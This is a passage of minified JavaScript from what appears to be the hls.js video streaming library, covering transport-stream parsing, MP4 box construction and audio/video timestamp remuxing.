for(;a<n;)if(hn(r,a)){var o=on(t,r,a,s,i);if(!o)break;a+=o.length,i++}else a++}parseID3PES(t,e){void 0===e.pts?V.warn("[tsdemuxer]: ID3 PES unknown PTS"):(e=G({},e,{type:this._avcTrack?Ce:Ie,duration:Number.POSITIVE_INFINITY}),t.samples.push(e))}}function pn(t,e,r,n){return{key:t,frame:!1,pts:e,dts:r,units:[],debug:n,length:0}}function gn(t,e){return((31&t[e+1])<<8)+t[e+2]}function vn(t){let i,e,a,s,n=0;var o=t.data;if(!t||0===t.size)return null;for(;o[0].length<19&&1<o.length;){var r=new Uint8Array(o[0].length+o[1].length);r.set(o[0]),r.set(o[1],o[0].length),o[0]=r,o.splice(1,1)}if(1!==((i=o[0])[0]<<16)+(i[1]<<8)+i[2])return null;{if((e=(i[4]<<8)+i[5])&&e>t.size-6)return null;var l=i[7];192&l&&(a=536870912*(14&i[9])+4194304*(255&i[10])+16384*(254&i[11])+128*(255&i[12])+(254&i[13])/2,64&l?(s=536870912*(14&i[14])+4194304*(255&i[15])+16384*(254&i[16])+128*(255&i[17])+(254&i[18])/2,54e5<a-s&&(V.warn(Math.round((a-s)/9e4)+"s delta between PTS and DTS, align them"),a=s)):s=a);let r=(l=i[8])+9;if(t.size<=r)return null;t.size-=r;var u=new Uint8Array(t.size);for(let e=0,t=o.length;e<t;e++){let t=(i=o[e]).byteLength;if(r){if(r>t){r-=t;continue}i=i.subarray(r),t-=r,r=0}u.set(i,n),n+=t}return e&&(e-=l+3),{data:u,pts:a,dts:s,len:e}}}function mn(t,e){if(t.units.length&&t.frame){if(void 0===t.pts){var r=e.samples,n=r.length;if(!n)return void e.dropped++;r=r[n-1],t.pts=r.pts,t.dts=r.dts}e.samples.push(t)}t.debug.length&&V.log(t.pts+"/"+t.dts+":"+t.debug)}class yn{static getSilentFrame(t,e){if("mp4a.40.2"===t){if(1===e)return new Uint8Array([0,200,0,128,35,128]);if(2===e)return new Uint8Array([33,0,73,144,2,25,0,35,128]);if(3===e)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,142]);if(4===e)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,128,44,128,8,2,56]);if(5===e)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,56]);if(6===e)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,0,178,0,32,8,224])}else{if(1===e)return new Uint8Array([1,64,34,128,163,78,230,128,186,8,0,0,0,28,6,241,193,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(2===e)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(3===e)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94])}}}const En=Math.pow(2,32)-1;class W{static init(){let t;for(t in W.types={avc1:[],avcC:[],btrt:[],dinf:[],dref:[],esds:[],ftyp:[],hdlr:[],mdat:[],mdhd:[],mdia:[],mfhd:[],minf:[],moof:[],moov:[],mp4a:[],".mp3":[],mvex:[],mvhd:[],pasp:[],sdtp:[],stbl:[],stco:[],stsc:[],stsd:[],stsz:[],stts:[],tfdt:[],tfhd:[],traf:[],trak:[],trun:[],trex:[],tkhd:[],vmhd:[],smhd:[]},W.types)W.types.hasOwnProperty(t)&&(W.types[t]=[t.charCodeAt(0),t.charCodeAt(1),t.charCodeAt(2),t.charCodeAt(3)]);var e=new Uint8Array([0,0,0,0,0,0,0,0,118,105,100,101,0,0,0,0,0,0,0,0,0,0,0,0,86,105,100,101,111,72,97,110,100,108,101,114,0]),r=new Uint8Array([0,0,0,0,0,0,0,0,115,111,117,110,0,0,0,0,0,0,0,0,0,0,0,0,83,111,117,110,100,72,97,110,100,108,101,114,0]),n=(e=(W.HDLR_TYPES={video:e,audio:r},new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,12,117,114,108,32,0,0,0,1])),r=new Uint8Array([0,0,0,0,0,0,0,0]),r=(W.STTS=W.STSC=W.STCO=r,W.STSZ=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0]),W.VMHD=new Uint8Array([0,0,0,1,0,0,0,0,0,0,0,0]),W.SMHD=new Uint8Array([0,0,0,0,0,0,0,0]),W.STSD=new Uint8Array([0,0,0,0,0,0,0,1]),new Uint8Array([105,115,111,109])),new Uint8Array([97,118,99,49])),i=new Uint8Array([0,0,0,1]);W.FTYP=W.box(W.types.ftyp,r,i,r,n),W.DINF=W.box(W.types.dinf,W.box(W.types.dref,e))}static box(t,...e){let r=8,n=e.length;for(var i=n;n--;)r+=e[n].byteLength;var a=new Uint8Array(r);for(a[0]=r>>24&255,a[1]=r>>16&255,a[2]=r>>8&255,a[3]=255&r,a.set(t,4),n=0,r=8;n<i;n++)a.set(e[n],r),r+=e[n].byteLength;return a}static hdlr(t){return W.box(W.types.hdlr,W.HDLR_TYPES[t])}static mdat(t){return W.box(W.types.mdat,t)}static mdhd(t,e){e*=t;var r=Math.floor(e/(1+En));e=Math.floor(e%(1+En));return W.box(W.types.mdhd,new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,t>>24&255,t>>16&255,t>>8&255,255&t,r>>24,r>>16&255,r>>8&255,255&r,e>>24,e>>16&255,e>>8&255,255&e,85,196,0,0]))}static mdia(t){return W.box(W.types.mdia,W.mdhd(t.timescale,t.duration),W.hdlr(t.type),W.minf(t))}static mfhd(t){return W.box(W.types.mfhd,new Uint8Array([0,0,0,0,t>>24,t>>16&255,t>>8&255,255&t]))}static minf(t){return"audio"===t.type?W.box(W.types.minf,W.box(W.types.smhd,W.SMHD),W.DINF,W.stbl(t)):W.box(W.types.minf,W.box(W.types.vmhd,W.VMHD),W.DINF,W.stbl(t))}static moof(t,e,r){return W.box(W.types.moof,W.mfhd(t),W.traf(r,e))}static moov(t){let e=t.length;for(var r=[];e--;)r[e]=W.trak(t[e]);return W.box.apply(null,[W.types.moov,W.mvhd(t[0].timescale,t[0].duration)].concat(r).concat(W.mvex(t)))}static mvex(t){let e=t.length;for(var r=[];e--;)r[e]=W.trex(t[e]);return W.box.apply(null,[W.types.mvex,...r])}static mvhd(t,e){e*=t;var r=Math.floor(e/(1+En));e=Math.floor(e%(1+En)),t=new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,t>>24&255,t>>16&255,t>>8&255,255&t,r>>24,r>>16&255,r>>8&255,255&r,e>>24,e>>16&255,e>>8&255,255&e,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255]);return W.box(W.types.mvhd,t)}static sdtp(t){var e,r=t.samples||[],n=new Uint8Array(4+r.length);let i;for(i=0;i<r.length;i++)e=r[i].flags,n[i+4]=e.dependsOn<<4|e.isDependedOn<<2|e.hasRedundancy;return W.box(W.types.sdtp,n)}static stbl(t){return W.box(W.types.stbl,W.stsd(t),W.box(W.types.stts,W.STTS),W.box(W.types.stsc,W.STSC),W.box(W.types.stsz,W.STSZ),W.box(W.types.stco,W.STCO))}static avc1(t){let n,i,a,e=[],r=[];for(n=0;n<t.sps.length;n++)i=t.sps[n],a=i.byteLength,e.push(a>>>8&255),e.push(255&a),e=e.concat(Array.prototype.slice.call(i));for(n=0;n<t.pps.length;n++)i=t.pps[n],a=i.byteLength,r.push(a>>>8&255),r.push(255&a),r=r.concat(Array.prototype.slice.call(i));var s=W.box(W.types.avcC,new Uint8Array([1,e[3],e[4],e[5],255,224|t.sps.length].concat(e).concat([t.pps.length]).concat(r))),o=t.width,l=t.height,u=t.pixelRatio[0],h=t.pixelRatio[1];return W.box(W.types.avc1,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,o>>8&255,255&o,l>>8&255,255&l,0,72,0,0,0,72,0,0,0,0,0,0,0,1,18,100,97,105,108,121,109,111,116,105,111,110,47,104,108,115,46,106,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,17,17]),s,W.box(W.types.btrt,new Uint8Array([0,28,156,128,0,45,198,192,0,45,198,192])),W.box(W.types.pasp,new Uint8Array([u>>24,u>>16&255,u>>8&255,255&u,h>>24,h>>16&255,h>>8&255,255&h])))}static esds(t){var e=t.config.length;return new Uint8Array([0,0,0,0,3,23+e,0,1,0,4,15+e,64,21,0,0,0,0,0,0,0,0,0,0,0,5].concat([e]).concat(t.config).concat([6,1,2]))}static mp4a(t){var e=t.samplerate;return W.box(W.types.mp4a,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,t.channelCount,0,16,0,0,0,0,e>>8&255,255&e,0,0]),W.box(W.types.esds,W.esds(t)))}static mp3(t){var e=t.samplerate;return W.box(W.types[".mp3"],new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,t.channelCount,0,16,0,0,0,0,e>>8&255,255&e,0,0]))}static stsd(t){return"audio"===t.type?"mp3"===t.segmentCodec&&"mp3"===t.codec?W.box(W.types.stsd,W.STSD,W.mp3(t)):W.box(W.types.stsd,W.STSD,W.mp4a(t)):W.box(W.types.stsd,W.STSD,W.avc1(t))}static tkhd(t){var e=t.id,r=t.duration*t.timescale,n=t.width,i=(t=t.height,Math.floor(r/(1+En)));r=Math.floor(r%(1+En));return W.box(W.types.tkhd,new Uint8Array([1,0,0,7,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,e>>24&255,e>>16&255,e>>8&255,255&e,0,0,0,0,i>>24,i>>16&255,i>>8&255,255&i,r>>24,r>>16&255,r>>8&255,255&r,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,n>>8&255,255&n,0,0,t>>8&255,255&t,0,0]))}static traf(t,e){var r=W.sdtp(t),n=t.id,i=Math.floor(e/(1+En));e=Math.floor(e%(1+En));return W.box(W.types.traf,W.box(W.types.tfhd,new Uint8Array([0,0,0,0,n>>24,n>>16&255,n>>8&255,255&n])),W.box(W.types.tfdt,new Uint8Array([1,0,0,0,i>>24,i>>16&255,i>>8&255,255&i,e>>24,e>>16&255,e>>8&255,255&e])),W.trun(t,r.length+16+20+8+16+8+8),r)}static trak(t){return t.duration=t.duration||4294967295,W.box(W.types.trak,W.tkhd(t),W.mdia(t))}static trex(t){return t=t.id,W.box(W.types.trex,new Uint8Array([0,0,0,0,t>>24,t>>16&255,t>>8&255,255&t,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1]))}static trun(t,e){var r,n,i,a,s=t.samples||[],o=s.length,l=12+16*o,u=new Uint8Array(l);let h;for(u.set(["video"===t.type?1:0,0,15,1,o>>>24&255,o>>>16&255,o>>>8&255,255&o,(e+=8+l)>>>24&255,e>>>16&255,e>>>8&255,255&e],0),h=0;h<o;h++)r=(a=s[h]).duration,n=a.size,i=a.flags,a=a.cts,u.set([r>>>24&255,r>>>16&255,r>>>8&255,255&r,n>>>24&255,n>>>16&255,n>>>8&255,255&n,i.isLeading<<2|i.dependsOn,i.isDependedOn<<6|i.hasRedundancy<<4|i.paddingValue<<1|i.isNonSync,61440&i.degradPrio,15&i.degradPrio,a>>>24&255,a>>>16&255,a>>>8&255,255&a],12+16*h);return W.box(W.types.trun,u)}static initSegment(t){W.types||W.init();t=W.moov(t);var e=new Uint8Array(W.FTYP.byteLength+t.byteLength);return e.set(W.FTYP),e.set(t,W.FTYP.byteLength),e}}W.types=void 0,W.HDLR_TYPES=void 0,W.STTS=void 0,W.STSC=void 0,W.STCO=void 0,W.STSZ=void 0,W.VMHD=void 0,W.SMHD=void 0,W.STSD=void 0,W.FTYP=void 0,W.DINF=void 0;function bn(t,e,r=1,n=!1){return t=t*e*r,n?Math.round(t):t}function An(t,e=!1){return bn(t,1e3,1/9e4,e)}let Cn,_n=null,Sn=null;class Ln{constructor(t,e,r,n=0){this.observer=void 0,this.config=void 0,this.typeSupported=void 0,this.ISGenerated=!1,this._initPTS=null,this._initDTS=null,this.nextAvcDts=null,this.nextAudioPts=null,this.videoSampleDuration=null,this.isAudioContiguous=!1,this.isVideoContiguous=!1,this.observer=t,this.config=e,this.typeSupported=r,this.ISGenerated=!1,null===_n&&(t=(navigator.userAgent||"").match(/Chrome\/(\d+)/i),_n=t?parseInt(t[1]):0),null===Sn&&(e=navigator.userAgent.match(/Safari\/(\d+)/i),Sn=e?parseInt(e[1]):0)}destroy(){}resetTimeStamp(t){V.log("[mp4-remuxer]: initPTS & initDTS reset"),this._initPTS=this._initDTS=t}resetNextTimestamp(){V.log("[mp4-remuxer]: reset next timestamp"),this.isVideoContiguous=!1,this.isAudioContiguous=!1}resetInitSegment(){V.log("[mp4-remuxer]: ISGenerated flag reset"),this.ISGenerated=!1}getVideoStartPts(t){let n=!1;return t=t.reduce(((t,e)=>{var r=e.pts-t;return r<-4294967296?(n=!0,Y(t,e.pts)):0<r?t:e.pts}),t[0].pts),n&&V.debug("PTS rollover detected"),t}remux(r,n,t,e,i,a,s,o){let l,u,h,c,d,f,p=i,g=i;var v=-1<r.pid,m=-1<n.pid,y=n.samples.length,E=0<r.samples.length,T=s&&0<y||1<y;if((!v||E)&&(!m||T)||this.ISGenerated||s){this.ISGenerated||(h=this.generateIS(r,n,i,a)),v=this.isVideoContiguous;let e,t=-1;T&&(t=function(e){for(let t=0;t<e.length;t++)if(e[t].key)return t;return-1}(n.samples),!v)&&this.config.forceKeyFrameOnDiscontinuity&&(f=!0,0<t?(V.warn(`[mp4-remuxer]: Dropped ${t} out of ${y} video samples due to a missing keyframe`),s=this.getVideoStartPts(n.samples),n.samples=n.samples.slice(t),n.dropped+=t,g+=(n.samples[0].pts-s)/n.inputTimeScale,e=g):-1===t&&(V.warn(`[mp4-remuxer]: No keyframe found out of ${y} video samples`),f=!1)),this.ISGenerated&&(E&&T&&(s=this.getVideoStartPts(n.samples),y=(Y(r.samples[0].pts,s)-s)/n.inputTimeScale,p+=Math.max(0,y),g+=Math.max(0,-y)),E?(r.samplerate||(V.warn("[mp4-remuxer]: regenerate InitSegment as audio detected"),h=this.generateIS(r,n,i,a)),u=this.remuxAudio(r,p,this.isAudioContiguous,a,m||T||o===_?g:void 0),T&&(s=u?u.endPTS-u.startPTS:0,n.inputTimeScale||(V.warn("[mp4-remuxer]: regenerate InitSegment as video detected"),h=this.generateIS(r,n,i,a)),l=this.remuxVideo(n,g,v,s))):T&&(l=this.remuxVideo(n,g,v,0)),l)&&(l.firstKeyFrame=t,l.independent=-1!==t,l.firstKeyFramePTS=e)}return this.ISGenerated&&this._initPTS&&this._initDTS&&(t.samples.length&&(d=kn(t,i,this._initPTS,this._initDTS)),e.samples.length)&&(c=Rn(e,i,this._initPTS)),{audio:u,video:l,initSegment:h,independent:f,text:c,id3:d}}generateIS(t,e,r,n){var i=t.samples,a=e.samples,s=this.typeSupported,o={},l=this._initPTS;let c,d,f,u=!l||n,h="audio/mp4";if(u&&(c=d=1/0),t.config&&i.length&&(t.timescale=t.samplerate,"mp3"===t.segmentCodec&&(s.mpeg?(h="audio/mpeg",t.codec=""):s.mp3&&(t.codec="mp3")),o.audio={id:"audio",container:h,codec:t.codec,initSegment:"mp3"===t.segmentCodec&&s.mpeg?new Uint8Array(0):W.initSegment([t]),metadata:{channelCount:t.channelCount}},u)&&(f=t.inputTimeScale,l&&f===l.timescale?u=!1:c=d=i[0].pts-Math.round(f*r)),e.sps&&e.pps&&a.length&&(e.timescale=e.inputTimeScale,o.video={id:"main",container:"video/mp4",codec:e.codec,initSegment:W.initSegment([e]),metadata:{width:e.width,height:e.height}},u)&&(f=e.inputTimeScale,l&&f===l.timescale?u=!1:(n=this.getVideoStartPts(a),s=Math.round(f*r),d=Math.min(d,Y(a[0].dts,n)-s),c=Math.min(c,n-s))),Object.keys(o).length)return this.ISGenerated=!0,u?(this._initPTS={baseTime:c,timescale:f},this._initDTS={baseTime:d,timescale:f}):c=f=void 0,{tracks:o,initPTS:c,timescale:f}}remuxVideo(t,e,r,n){var i=t.inputTimeScale,a=t.samples,s=[],o=a.length,l=this._initPTS;let d,u=this.nextAvcDts,h=8,c=this.videoSampleDuration,f=Number.POSITIVE_INFINITY,p=Number.NEGATIVE_INFINITY,g=!1;r&&null!==u||(u=(e*=i)-(M=a[0].pts-Y(a[0].dts,a[0].pts)));var v=l.baseTime*i/l.timescale;for(let t=0;t<o;t++){var m=a[t];m.pts=Y(m.pts-v,u),m.dts=Y(m.dts-v,u),m.dts<a[0<t?t-1:t].dts&&(g=!0)}g&&a.sort((function(t,e){var r=t.dts-e.dts;t=t.pts-e.pts;return r||t})),d=a[0].dts;var y=(e=a[a.length-1].dts-d)?Math.round(e/(o-1)):c||t.inputTimeScale/30;r&&(l=(M=d-u)<-1,(e=y<M)||l)&&(e?V.warn(`AVC: ${An(M,!0)} ms (${M}dts) hole between fragments detected, filling it`):V.warn(`AVC: ${An(-M,!0)} ms (${M}dts) overlapping between fragments detected`),!l||u>=a[0].pts)&&(d=u,r=a[0].pts-M,a[0].dts=d,a[0].pts=r,V.log(`Video: First PTS/DTS adjusted: ${An(r,!0)}/${An(d,!0)}, delta: ${An(M,!0)} ms`)),d=Math.max(0,d);let S,E=0,T=0;for(let t=0;t<o;t++){var b=a[t],A=b.units,_=A.length;let e=0;for(let t=0;t<_;t++)e+=A[t].data.length;T+=e,E+=_,b.length=e,b.dts=Math.max(b.dts,d),f=Math.min(b.pts,f),p=Math.max(b.pts,p)}e=a[o-1].dts,l=T+4*E+8;try{S=new Uint8Array(l)}catch(t){return void this.observer.emit($.ERROR,$.ERROR,{type:K.MUX_ERROR,details:H.REMUX_ALLOC_ERROR,fatal:!1,error:t,bytes:l,reason:"fail allocating video mdat "+l})}var L=new DataView(S.buffer);L.setUint32(0,l),S.set(W.types.mdat,4);let k=!1,R=Number.POSITIVE_INFINITY,w=Number.POSITIVE_INFINITY,I=Number.NEGATIVE_INFINITY,D=Number.NEGATIVE_INFINITY;for(let e=0;e<o;e++){var C,P=a[e],F=P.units;let t,r=0;for(let t=0,e=F.length;t<e;t++){var N=(x=F[t]).data,x=x.data.byteLength;L.setUint32(h,x),h+=4,S.set(N,h),h+=x,r+=4+x}e<o-1?(c=a[e+1].dts-P.dts,t=a[e+1].pts-P.pts):(O=this.config,C=0<e?P.dts-a[e-1].dts:y,t=0<e?P.pts-a[e-1].pts:y,O.stretchShortVideoTrack&&null!==this.nextAudioPts&&Math.floor(O.maxBufferHole*i)<(O=(n?f+n*i:this.nextAudioPts)-P.pts)?((c=O-C)<0?c=C:k=!0,V.log(`[mp4-remuxer]: It is approximately ${O/90} ms to the next segment; using duration ${c/90} ms for the last video frame.`)):c=C);var O=Math.round(P.pts-P.dts);R=Math.min(R,c),I=Math.max(I,c),w=Math.min(w,t),D=Math.max(D,t),s.push(new wn(P.key,c,r,O))}if(s.length)if(_n)_n<70&&((r=s[0].flags).dependsOn=2,r.isNonSync=0);else if(Sn&&D-w<I-R&&y/I<.025&&0===s[0].cts){V.warn("Found irregular gaps in sample duration. Using PTS instead of DTS to determine MP4 sample duration.");let r=d;for(let t=0,e=s.length;t<e;t++){var B,U=r+s[t].duration,j=r+s[t].cts;t<e-1?(B=U+s[t+1].cts,s[t].duration=B-j):s[t].duration=t?s[t-1].duration:y,s[t].cts=0,r=U}}c=k||!c?y:c,this.nextAvcDts=u=e+c,this.videoSampleDuration=c,this.isVideoContiguous=!0;var M={data1:W.moof(t.sequenceNumber++,d,G({},t,{samples:s})),data2:S,startPTS:f/i,endPTS:(p+c)/i,startDTS:d/i,endDTS:u/i,type:"video",hasAudio:!1,hasVideo:!0,nb:s.length,dropped:t.dropped};return t.samples=[],t.dropped=0,M}remuxAudio(i,t,r,e,n){var a=i.inputTimeScale,s=a/(i.samplerate||a),o="aac"===i.segmentCodec?1024:1152,l=o*s,u=this._initPTS,h="mp3"===i.segmentCodec&&this.typeSupported.mpeg,c=[],d=void 0!==n;let f=i.samples,p=h?0:8,g=this.nextAudioPts||-1;const v=t*a,m=u.baseTime*a/u.timescale;if(this.isAudioContiguous=r=r||f.length&&0<g&&(e&&Math.abs(v-g)<9e3||Math.abs(Y(f[0].pts-m,v)-g)<20*l),f.forEach((function(t){t.pts=Y(t.pts-m,v)})),!r||g<0){if(!(f=f.filter((t=>0<=t.pts))).length)return;g=0===n?0:e&&!d?Math.max(0,v):f[0].pts}if("aac"===i.segmentCodec){var y=this.config.maxAudioFramesDrift;for(let r=0,n=g;r<f.length;r++){var E=f[r],T=E.pts,b=T-n,A=Math.abs(1e3*b/a);if(b<=-y*l&&d)0===r&&(V.warn(`Audio frame @ ${(T/a).toFixed(3)}s overlaps nextAudioPts by ${Math.round(1e3*b/a)} ms.`),this.nextAudioPts=g=n=T);else if(y*l<=b&&A<1e4&&d){let e=Math.round(b/l);(n=T-e*l)<0&&(e--,n+=l),0===r&&(this.nextAudioPts=g=n),V.warn(`[mp4-remuxer]: Injecting ${e} audio frame @ ${(n/a).toFixed(3)}s due to ${Math.round(1e3*b/a)} ms gap.`);for(let t=0;t<e;t++){var _=Math.max(n,0);let t=yn.getSilentFrame(i.manifestCodec||i.codec,i.channelCount);t||(V.log("[mp4-remuxer]: Unable to get silent frame for given audio codec; duplicating last frame instead."),t=E.unit.subarray()),f.splice(r,0,{unit:t,pts:_}),n+=l,r++}}E.pts=n,n+=l}}let k,S=null,L=null,R=0,w=f.length;for(;w--;)R+=f[w].unit.byteLength;for(let e=0,t=f.length;e<t;e++){var I=f[e],D=I.unit;let t=I.pts;if(null!==L)c[e-1].duration=Math.round((t-L)/s);else{if(r&&"aac"===i.segmentCodec&&(t=g),S=t,!(0<R))return;R+=p;try{k=new Uint8Array(R)}catch(t){return void this.observer.emit($.ERROR,$.ERROR,{type:K.MUX_ERROR,details:H.REMUX_ALLOC_ERROR,fatal:!1,error:t,bytes:R,reason:"fail allocating audio mdat "+R})}h||(new DataView(k.buffer).setUint32(0,R),k.set(W.types.mdat,4))}k.set(D,p),p+=I=D.byteLength,c.push(new wn(!0,o,I,0)),L=t}if(t=c.length)return u=c[c.length-1],this.nextAudioPts=g=L+s*u.duration,n=h?new Uint8Array(0):W.moof(i.sequenceNumber++,S/s,G({},i,{samples:c})),i.samples=[],n={data1:n,data2:k,startPTS:e=S/a,endPTS:u=g/a,startDTS:e,endDTS:u,type:"audio",hasAudio:!0,hasVideo:!1,nb:t},this.isAudioContiguous=!0,n}remuxEmptyAudio(t,e,r,n){var i=t.inputTimeScale,a=t.samplerate||i,s=this.nextAudioPts,o=9e4*(o=this._initDTS).baseTime/o.timescale,l=(null!==s?s:n.startDTS*i)+o,u=(s=n.endDTS*i+o,i/a*1024),h=Math.ceil((s-l)/u),c=yn.getSilentFrame(t.manifestCodec||t.codec,t.channelCount);if(V.warn("[mp4-remuxer]: remux empty Audio"),c){var d=[];for(let t=0;t<h;t++){var f=l+t*u;d.push({unit:c,pts:f,dts:f})}return t.samples=d,this.remuxAudio(t,e,r,!1)}V.trace("[mp4-remuxer]: Unable to remuxEmptyAudio since we were unable to get a silent frame for given audio codec")}}function Y(t,e){let r;if(null!==e)for(r=e<t?-8589934592:8589934592;4294967296<Math.abs(t-e);)t+=r;return t}function kn(e,r,n,i){var a=e.samples.length;if(a){var s=e.inputTimeScale;for(let t=0;t<a;t++){var o=e.samples[t];o.pts=Y(o.pts-n.baseTime*s/n.timescale,r*s)/s,o.dts=Y(o.dts-i.baseTime*s/i.timescale,r*s)/s}var t=e.samples;return e.samples=[],{samples:t}}}function Rn(e,r,n){var i=e.samples.length;if(i){var a=e.inputTimeScale;for(let t=0;t<i;t++){var s=e.samples[t];s.pts=Y(s.pts-n.baseTime*a/n.timescale,r*a)/a}e.samples.sort(((t,e)=>t.pts-e.pts));var t=e.samples;return e.samples=[],{samples:t}}}class wn{constructor(t,e,r,n){this.size=void 0,this.duration=void 0,this.cts=void 0,this.flags=void 0,this.duration=e,this.size=r,this.cts=n,this.flags=new In(t)}}class In{constructor(t){this.isLeading=0,this.isDependedOn=0,this.hasRedundancy=0,this.degradPrio=0,this.dependsOn=1,this.isNonSync=1,this.dependsOn=t?2:1,this.isNonSync=t?0:1}}function Dn(t,e){return(t=null==t?void 0:t.codec)&&4<t.length?t:"hvc1"===t||"hev1"===t?"hvc1.1.6.L120.90":"av01"===t?"av01.0.04M.08":"avc1"===t||e===k?"avc1.42e01e":"mp4a.40.5"}try{Cn=self.performance.now.bind(self.performance)}catch(t){V.debug("Unable to use Performance API on this environment"),Cn="undefined"!=typeof self&&self.Date.now}const Pn=[{demux:class{constructor(t,e){this.remainderData=null,this.timeOffset=0,this.config=void 0,this.videoTrack=void 0,this.audioTrack=void 0,this.id3Track=void 0,this.txtTrack=void 0,this.config=e}resetTimeStamp(){}resetInitSegment(t,e,r,n){var i,a,s,o=this.videoTrack=c("video",1),l=this.audioTrack=c("audio",1),u=this.txtTrack=c("text",1);this.id3Track=c("id3",1),this.timeOffset=0,null!=t&&t.byteLength&&((t=Ht(t)).video&&(({id:i,timescale:a,codec:s}=t.video),o.id=i,o.timescale=u.timescale=a,o.codec=s),t.audio&&(({id:i,timescale:a,codec:s}=t.audio),l.id=i,l.timescale=a,l.codec=s),u.id=jt.text,o.sampleDuration=0,o.duration=l.duration=n)}resetContiguity(){this.remainderData=null}static probe(t){return 0<w(t=16384<t.length?t.subarray(0,16384):t,["moof"]).length}demux(t,e){this.timeOffset=e;let r=t;var n,i=this.videoTrack,a=this.txtTrack,s=(this.config.progressive?(this.remainderData&&(r=Yt(this.remainderData,t)),n={valid:null,remainder:null},(s=w(t=r,["moof"]))&&(s.length<2?n.remainder=t:(s=s[s.length-1],n.valid=kt(t,0,s.byteOffset-8),n.remainder=kt(t,s.byteOffset-8))),t=n,this.remainderData=t.remainder,i.samples=t.valid||new Uint8Array):i.samples=r,this.extractID3Track(i,e));return a.samples=qt(e,i),{videoTrack:i,audioTrack:this.audioTrack,id3Track:s,textTrack:this.txtTrack}}flush(){var t=this.timeOffset,e=this.videoTrack,r=this.txtTrack,n=(e.samples=this.remainderData||new Uint8Array,this.remainderData=null,this.extractID3Track(e,this.timeOffset));return r.samples=qt(t,e),{videoTrack:e,audioTrack:c(),id3Track:n,textTrack:c()}}extractID3Track(t,n){const i=this.id3Track;return t.samples.length&&(t=w(t.samples,["emsg"]))&&t.forEach((e=>{if(e=function(t){let r="",n="",i=0,a=0,s=0,o=0,l=0,u=0;if(0===(e=t[0])){for(;"\0"!==v(t.subarray(u,u+1));)r+=v(t.subarray(u,u+1)),u+=1;for(r+=v(t.subarray(u,u+1)),u+=1;"\0"!==v(t.subarray(u,u+1));)n+=v(t.subarray(u,u+1)),u+=1;n+=v(t.subarray(u,u+1)),u+=1,i=R(t,12),a=R(t,16),o=R(t,20),l=R(t,24),u=28}else if(1===e){u+=4,i=R(t,u);var e=R(t,u+=4),h=R(t,u+=4);for(u+=4,s=2**32*e+h,J(s)||(s=Number.MAX_SAFE_INTEGER,V.warn("Presentation time exceeds safe integer limit and wrapped to max safe integer in parsing emsg box")),o=R(t,u),u+=4,l=R(t,u),u+=4;"\0"!==v(t.subarray(u,u+1));)r+=v(t.subarray(u,u+1)),u+=1;for(r+=v(t.subarray(u,u+1)),u+=1;"\0"!==v(t.subarray(u,u+1));)n+=v(t.subarray(u,u+1)),u+=1;n+=v(t.subarray(u,u+1)),u+=1}return{schemeIdUri:r,value:n,timeScale:i,presentationTime:s,presentationTimeDelta:a,eventDuration:o,id:l,payload:e=t.subarray(u,t.byteLength)}}(e),tn.test(e.schemeIdUri)){var r=N(e.presentationTime)?e.presentationTime/e.timeScale:n+e.presentationTimeDelta/e.timeScale;let t=4294967295===e.eventDuration?Number.POSITIVE_INFINITY:e.eventDuration/e.timeScale;t<=.001&&(t=Number.POSITIVE_INFINITY),e=e.payload,i.samples.push({data:e,len:e.byteLength,dts:r,pts:r,type:Ce,duration:t})}})),i}demuxSampleAes(t,e,r){return Promise.reject(new Error("The MP4 demuxer does not support SAMPLE-AES decryption"))}destroy(){}},remux:class{constructor(){this.emitInitSegment=!1,this.audioCodec=void 0,this.videoCodec=void 0,this.initData=void 0,this.initPTS=null,this.initTracks=void 0,this.lastEndTime=null}destroy(){}resetTimeStamp(t){this.initPTS=t,this.lastEndTime=null}resetNextTimestamp(){this.lastEndTime=null}resetInitSegment(t,e,r,n){this.audioCodec=e,this.videoCodec=r,this.generateInitSegment(function(t,e){if(t&&e){const n=e.keyId;n&&e.isCommonEncryption&&w(t,["moov","trak"]).forEach((t=>{t=w(t,["mdia","minf","stbl","stsd"])[0].subarray(8);let e=w(t,["enca"]);const r=0<e.length;(e=r?e:w(t,["encv"])).forEach((t=>{w(r?t.subarray(28):t.subarray(78),["sinf"]).forEach((t=>{var e;(t=Vt(t))&&!(e=t.subarray(8,24)).some((t=>0!==t))&&(V.log(`[eme] Patching keyId in 'enc${r?"a":"v"}>sinf>>tenc' box: ${g_hexDump(e)} -> 